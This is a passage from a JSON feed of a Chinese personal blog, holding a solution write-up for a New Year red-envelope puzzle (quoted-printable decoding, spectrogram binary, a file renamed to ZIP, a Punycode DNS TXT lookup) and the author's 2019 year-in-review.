一个思路嘛），于是改后缀 .zip 顺利打开。然后红包口令码就藏在奶冰的 .osu 文件中了，由提示可知是明文，打开即可得到。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1542\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg\" alt=\"\" width=\"457\" height=\"255\"></a>\n<h1>我的红包</h1>\n<p>相比起来<a href=\"https://flyhigher.top/diary/1464.html\">我的题目</a>就简单很多了嘛...三天时间一共发出了 25 个红包，包括一位重复领取的🌚，比前几年还是多了一些的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg\" alt=\"\" width=\"500\" height=\"306\" class=\"aligncenter size-full wp-image-1554\"></a>\n<p><span>这位同学以后请不要多次领取🌚</span></p>\n<p>那么来看看答案吧。</p>\n<h2>第一阶段</h2>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>首先观察字符串，可以发现 <code>.</code> <code>/</code> <code>_</code> 等一些 ASCII 字符原样留在了字符串中，而其他字符被由 <code>=</code> 和十六进制构成的某种编码所替代。如果你正好有所了解，你应该能认出这是 Quoted-printable 编码，这是一种常用于邮件中的编码，可以用<a href=\"https://mothereff.in/quoted-printable\">这个页面</a>解码。如果你不了解，你也应该可以发现这种编码和 URL 编码非常相似。如果你把 <code>=</code> 替换为 <code>%</code>，那么你就可以用各种方法顺利地把它按 URL 编码来进行解码，最后可以得到 <code>αхtоn.іm/соdе_оf_2020_⒈mρз</code>。这个字符串里大部分字符都不是 ASCII 字符，只是长得像而已。根据第一个提示“全是 ASCII 字符”，按样子把字符串用 ASCII 字符抄一遍，可以得到最终 URL 为 <code>axton.im/code_of_2020_1.mp3</code>。</p>\n<h2>第二阶段</h2>\n<p>下载音频，可以听出音频是经过某种处理的白噪音。白噪音的特点是各频段的功率都均匀分布，在白噪音上做文章，很容易就可以联想到线索藏在频谱中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1534\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg\" alt=\"\" width=\"1200\" height=\"719\"></a>\n<p>频谱被处理成了 24x3 的网格，结合第二条提示“24x3，横向读取”可以推断出是将频谱当作二进制读取，得到 <code>01111001 01110010 01100011 00101110 01101101 01100101 00101111 00110010 00110000</code>，转为 ASCII 字符可得 <code>yrc.me/20</code>。</p>\n<h2>第三阶段</h2>\n<p>打开上一步得到的页面，提示要求输入十位数密码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1536\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg\" alt=\"\" width=\"663\" height=\"460\"></a>\n<p>如果你在上一步注意到了这个音频文件奇怪的属性，你可以反应过来这里的密码就是 <code>2000202020</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1537\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg\" alt=\"\" width=\"421\" height=\"651\"></a>\n<p>如果你没有注意到，查看页面代码可以看到一条注释 <code>&lt;!-- Tips: the attribute of the audio --&gt;</code> 将你引导向音频文件的属性。输入密码，解锁即可进入下一步。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1535\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg\" alt=\"\" width=\"397\" height=\"223\"></a>\n<h2>第四阶段</h2>\n<p>可以看到是一张图片，内容为“<del>.JPG</del>”和“.ZIP”。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter size-large wp-image-1532\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90#\" alt=\"\" width=\"724\" height=\"1024\"></a>\n<p>和去年一样的套路，下载图片，将后缀名改为 .zip 然后打开，可以看到 README.txt。</p>\n<h2>最后一步</h2>\n<p>查看 README.txt 的内容，可以了解到需要去 🤔.axton.cc 获取红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1538\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg\" alt=\"\" width=\"1131\" height=\"278\"></a>\n<p>扔到浏览器里会出现奶冰同款找不到 IP，于是可以联想到 TXT 记录。唯一的问题是 🤔 这个 Emoji 需要如何处理。域名使用 Punycode 将 Unicode 字符转换为 ASCII 字符，特点是以 <code>xn--</code> 开头。如果你把上面这个域名扔进浏览器，你会发现它变成了 <code>xn--wp9h.axton.cc</code>。然后查询 TXT 记录，即可得到红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1527\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg\" alt=\"\" width=\"804\" height=\"557\"></a>\n","link":"https://flyhigher.top/develop/1519.html"},{"title":"无垠 2019 年度总结","date":"2019-12-29 12:25:52","description":"\n<p>又是时间飞快的一年...写 2018 总结的情景似乎还在眼前，转眼居然已经到 2019 年末了。</p>\n<p>2019 年，发生了太多事情，包括真的转折了人生的高考，这也导致我博客更新的不多（难以置信居然才更了两篇...），不过两篇技术性文章已经在路上了，可以期待一下。</p>\n<p>2019 年我也学了不少东西（单指技术方面），比如终于认真学了 Vue（但是还要练手）。书买了一大堆，看完的倒是没几本orz</p>\n<p>呼，好吧，是时候回顾一下充满坎坷的这一年了。2019 年还剩下最后两天，希望 2020 年，我能做得更好。</p>\n<h1>一些数据</h1>\n<p>照惯例先来看看一些数据吧。今年是统计系统完整统计了的第二年，终于可以和去年的数据比较一下了。以下数据的统计范围是 2019年1月1日0时至 2019年12月29日20时。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 26,901 (<span>+4%</span>)，年 PV 76,583 (<span>+3%</span>)，日均 UV 73.7，平均停留时间 5分13秒 (<span>-13.8%</span>)，平均跳出率 53% (<span>+20.5%</span>)。一年有效文章数 2 (<span>-50%</span>)，新增评论 439 条。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg\" alt=\"\" width=\"1000\" height=\"1143\" class=\"aligncenter size-full wp-image-1511\"></a>\n<p>有趣的是今年文章数腰斩，访问数反而小有提升。<del>如果我哪天不更新了，访问数是不是可以无限大呢？</del></p>\n<p>今年博客最大的改动就是把整体风格切换到了 Material Design 2（当然这是 <a href=\"https://flyhigher.top/develop/788.html\">MDx</a> 中的可选功能，给自己打个广告2333），此外还有比较失败的 WebP 改造计划，因为和缓存冲突已经回滚了。<a href=\"https://flyhigher.top/develop/1245.html\">ABS 系统</a>进展不大，主要是真的没有太多时间，还是要再学习一个。</p>\n<h2>个人主页</h2>\n<p>虽然个人主页的 TODO List 列了老长，但今年完全没有更新，也没有推广，从今年 8 月底开始还莫名被某墙认证了，直到 11 月底才恢复，于是今年总访问量比去年少了很多，</p>\n<p>有多少呢？这么少：总 UV 2,141 (<span>-65.9%</span>)，总 PV 2,744 (<span>-66.6%</span>)，日均 UV 6 (<span>-65.9%</span>)，平均停留时间 62秒 (<span>+19.2%</span>)。主要来源是知乎和 V2EX，还有一些甚至是从微信来的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg\" alt=\"\" width=\"1000\" height=\"1103\" class=\"aligncenter size-full wp-image-1512\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 8 次，新增 171 commits，2 种语言的翻译，Star 数增加了 175，现有 408。感谢所有人的支持，尤其是 <a href=\"https://github.com/Sn0bzy\" rel=\"noopener noreferrer\" target=\"_blank\">Hasan CAN</a>, <a href=\"https://github.com/yechs\" rel=\"noopener noreferrer\" target=\"_blank\">Ye Shu</a>, <a href=\"https://github.com/StarryLeo\" rel=\"noopener noreferrer\" target=\"_blank\">StarryLeo</a>, <a href=\"https://github.com/DCTewi\" rel=\"noopener noreferrer\" target=\"_blank\">冻葱Tewi</a>, <a href=\"https://github.com/syfxlin\" rel=\"noopener noreferrer\" target=\"_blank\">Otstar Lin</a> 等为 MDx 做出了不小贡献的你们。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：<a href=\"https://flyhigher.top/photograph/1309.html\">上手</a> DJI OSMO Pocket</li>\n<li>四月：最后一次参加浙江省普通高中学业水平考试</li>\n<li>五月：MDx 喜提 300 Stars</li>\n<li>六月：高考 <del>炸了，差亿点点上浙大</del>\n</li>\n<li>六月：入手了 Oneplus 7 Pro</li>\n<li>六月：和同学一起去成都重庆旅行</li>\n<li>六月：第一次近距离感受到地震</li>\n<li>六月：<a href=\"https://flyhigher.top/diary/1411.html\">入手</a>了一台雷蛇灵刃 15，目前是主力机</li>\n<li>七月：参与组织 THE Hack 2019 活动</li>\n<li>七月：面基了 <a href=\"https://itroy.cc/\" rel=\"noopener noreferrer\" target=\"_blank\">Tory</a>, Bie Shi 和 <a href=\"https://oxz.me/\" rel=\"noopener noreferrer\" target=\"_blank\">FHYunCai</a>\n</li>\n<li>八月：一个人去厦门武汉转了一圈，拍了自己的第一个 Vlog</li>\n<li>八月：入手了一个 Kindle Paperwhite 4，没有泡面可以压，于是用来看英文小说了</li>\n<li>八月：加入 TEDxNingbo 志愿者团队</li>\n<li>八月：和 Ralph 面基</li>\n<li>八月：入手了一个 Yubikey</li>\n<li>九月：人生第一次参加雅思考试 <del>7分，蛮开心的</del>\n</li>\n<li>十月：入手了一个 Samsung Galaxy Watch Active 2 <del>觉得不值</del>\n</li>\n<li>十一月：MDx 达到 400 Stars</li>\n<li>十一月：为 TEDxNingbo 设计开发的 H5 上线</li>\n<li>十一月：入手了第一台胶片相机，试图入坑胶片摄影</li>\n<li>十一月：参加 TEDxNingbo 2019 大会</li>\n<li>十二月：<del>我 Cytus II 入门了</del>\n</li>\n</ul>\n<h1>跨年红包</h1>\n<p>这算「传统习俗」了。和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2020年1月2日。</p>\n<p>今年的解谜旅程，从下面这个字符串开始。</p>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>由于今年的题目比以前稍微难了一些，所以今年的红包金额还是比较大的，而且不限量，尽你所能试一试吧。</p>\n<p>一点你可能用得上的提示：URL 里全是 ASCII 字符 / 24x3，横向读取。</p>\n<p><a href=\"https://flyhigher.top/develop/1519.html\">答案</a>已公布。</p>\n<h1>跨年海报</h1>\n<p>这算是另一个「传统习俗」（笑）。因为我有做跨年海报的习惯，所以以下就是今年份的海报啦。</p>\n<p>用了 C4D+PS，还有我的一整个下午。</p>\n<p>提前祝各位新年快乐！</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter wp-image-1467 size-large\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90#\" alt=\"\" width=\"724\" height=\"1024\"></a>\n","link":"https://flyhigher.top/diary/1464.html"}]